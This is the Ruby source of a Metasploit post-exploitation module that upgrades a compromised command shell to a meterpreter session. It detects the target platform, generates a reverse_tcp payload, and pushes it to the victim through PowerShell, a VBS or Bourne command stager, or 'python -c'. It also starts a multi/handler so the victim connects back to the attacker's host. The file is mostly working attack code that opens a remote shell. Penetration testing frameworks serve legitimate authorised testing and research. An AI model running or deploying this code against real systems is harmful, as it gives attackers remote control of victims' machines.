##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/powershell'
require 'msf/core/post/windows/powershell'

class Metasploit3 < Msf::Post
  include Exploit::Powershell
  include Post::Windows::Powershell

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Shell to Meterpreter Upgrade',
        'Description'   => %q{
          This module attempts to upgrade a command shell to meterpreter. The shell
          platform is automatically detected and the best version of meterpreter for
          the target is selected. Currently meterpreter/reverse_tcp is used on Windows
          and Linux, with 'python/meterpreter/reverse_tcp' used on all others.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Tom Sellers <tom [at] fadedcode.net>'],
        'Platform'      => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],
        'SessionTypes'  => [ 'shell' ]
      ))
    register_options(
      [
        OptAddress.new('LHOST',
          [false, 'IP of host that will receive the connection from the payload.']),
        OptInt.new('LPORT',
          [false, 'Port for Payload to connect to.', 4433]),
        OptBool.new('HANDLER',
          [ true, 'Start an Exploit Multi Handler to receive the connection', true])
      ], self.class)
    deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
  end

  # Run Method for when run command is issued
  def run
    print_status("Upgrading session: #{datastore['SESSION']}")

    # Try hard to find a valid LHOST value in order to
    # make running 'sessions -u' as robust as possible.
    if datastore['LHOST']
      lhost = datastore['LHOST']
    elsif framework.datastore['LHOST']
      lhost = framework.datastore['LHOST']
    else
      lhost = session.tunnel_local.split(':')[0]
    end

    # If nothing else works....
    lhost = Rex::Socket.source_address if lhost.blank?

    lport = datastore['LPORT']

    # Handle platform specific variables and settings
    case session.platform
    when /win/i
      platform = 'win'
      payload_name = 'windows/meterpreter/reverse_tcp'
      lplat = [Msf::Platform::Windows]
      larch = [ARCH_X86]
      psh_arch = 'x86'
    when /osx/i
      platform = 'python'
      payload_name = 'python/meterpreter/reverse_tcp'
    when /solaris/i
      platform = 'python'
      payload_name = 'python/meterpreter/reverse_tcp'
    else
      # Find the best fit, be specific w/ uname to avoid matching hostname or something else
      target_info = cmd_exec('uname -mo')
      if target_info =~ /linux/i && target_info =~ /86/
        # Handle linux shells that were identified as 'unix'
        platform = 'linux'
        payload_name = 'linux/x86/meterpreter/reverse_tcp'
        lplat = [Msf::Platform::Linux]
        larch = [ARCH_X86]
      elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
        # Generic fallback for OSX, Solaris, Linux/ARM
        platform = 'python'
        payload_name = 'python/meterpreter/reverse_tcp'
      end
    end

    if platform.blank?
      print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
      return nil
    end

    payload_data = generate_payload(lhost, lport, payload_name)
    if payload_data.blank?
      print_error("Unable to build a suitable payload for #{session.platform} using payload #{payload_name}.")
      return nil
    end

    if datastore['HANDLER']
      listener_job_id = create_multihandler(lhost, lport, payload_name)
      if listener_job_id.blank?
        print_error("Failed to start multi/handler on #{datastore['LPORT']}, it may be in use by another process.")
        return nil
      end
    end

    case platform
    when 'win'
      if have_powershell?
        psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
        cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
      else
        exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
        aborted = transmit_payload(exe)
      end
    when 'python'
      cmd_exec("python -c \"#{payload_data}\"")
    else
      exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
      aborted = transmit_payload(exe)
    end

    cleanup_handler(listener_job_id, aborted) if datastore['HANDLER']
    return nil
  end

  def transmit_payload(exe)
    #
    # Generate the stager command array
    #
    linemax = 1700
    if (session.exploit_datastore['LineMax'])
      linemax = session.exploit_datastore['LineMax'].to_i
    end
    opts = {
      :linemax => linemax,
      #:nodelete => true # keep temp files (for debugging)
    }
    if session.platform =~ /win/i
      opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
      cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
    else
      opts[:background] = true
      cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
      # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
      #       as /bin/sh on OS X doesn't support the -n option on echo
    end

    cmds = cmdstager.generate(opts)
    if cmds.nil? || cmds.length < 1
      print_error('The command stager could not be generated')
      raise ArgumentError
    end

    #
    # Calculate the total size
    #
    total_bytes = 0
    cmds.each { |cmd| total_bytes += cmd.length }

    begin
      #
      # Run the commands one at a time
      #
      sent = 0
      aborted = false
      cmds.each { |cmd|
        ret = session.shell_command_token(cmd)
        if !ret
          aborted = true
        else
          ret.strip!
          aborted = true if !ret.empty?
        end
        if aborted
          print_error('Error: Unable to execute the following command: ' + cmd.inspect)
          print_error('Output: ' + ret.inspect) if ret && !ret.empty?
          break
        end

        sent += cmd.length

        progress(total_bytes, sent)
      }
    rescue ::Interrupt
      # TODO: cleanup partial uploads!
      aborted = true
    rescue => e
      print_error("Error: #{e}")
      aborted = true
    end

    return aborted
  end

  def cleanup_handler(listener_job_id, aborted)
    # Return if the job has already finished
    return nil if framework.jobs[listener_job_id].nil?

    framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
      if !aborted
        timer = 0
        while !framework.jobs[listener_job_id].nil? && timer < 10
          # Wait up to 10 seconds for the session to come in..
          sleep(1)
          timer += 1
        end
      end
      print_status('Stopping multi/handler')
      framework.jobs.stop_job(listener_job_id)
    }
  end

  #
  # Show the progress of the upload
  #
  def progress(total, sent)
    done = (sent.to_f / total.to_f) * 100
    print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
  end

  # Method for checking if a listener for a given IP and port is present
  # will return true if a conflict exists and false if none is found
  def check_for_listener(lhost, lport)
    client.framework.jobs.each do |k, j|
      if j.name =~ / multi\/handler/
        current_id = j.jid
        current_lhost = j.ctx[0].datastore['LHOST']
        current_lport = j.ctx[0].datastore['LPORT']
        if lhost == current_lhost && lport == current_lport.to_i
          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
          return true
        end
      end
    end
    return false
  end

  # Starts a multi/handler session
  def create_multihandler(lhost, lport, payload_name)
    pay = client.framework.payloads.create(payload_name)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    print_status('Starting exploit multi handler')
    if !check_for_listener(lhost, lport)
      # Set options for module
      mh = client.framework.exploits.create('multi/handler')
      mh.share_datastore(pay.datastore)
      mh.datastore['WORKSPACE'] = client.workspace
      mh.datastore['PAYLOAD'] = payload_name
      mh.datastore['EXITFUNC'] = 'thread'
      mh.datastore['ExitOnSession'] = true
      # Validate module options
      mh.options.validate(mh.datastore)
      # Execute showing output
      mh.exploit_simple(
          'Payload'     => mh.datastore['PAYLOAD'],
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'    => true
        )

      # Check to make sure that the handler is actually valid
      # If another process has the port open, then the handler will fail
      # but it takes a few seconds to do so.  The module needs to give
      # the handler time to fail or the resulting connections from the
      # target could end up on on a different handler with the wrong payload
      # or dropped entirely.
      select(nil, nil, nil, 5)
      return nil if framework.jobs[mh.job_id.to_s].nil?

      return mh.job_id.to_s
    else
      print_error('A job is listening on the same local port')
      return nil
    end
  end

  def generate_payload(lhost, lport, payload_name)
    payload = framework.payloads.create(payload_name)
    options = "LHOST=#{lhost} LPORT=#{lport}"
    buf = payload.generate_simple('OptionStr' => options)
    buf
  end
end
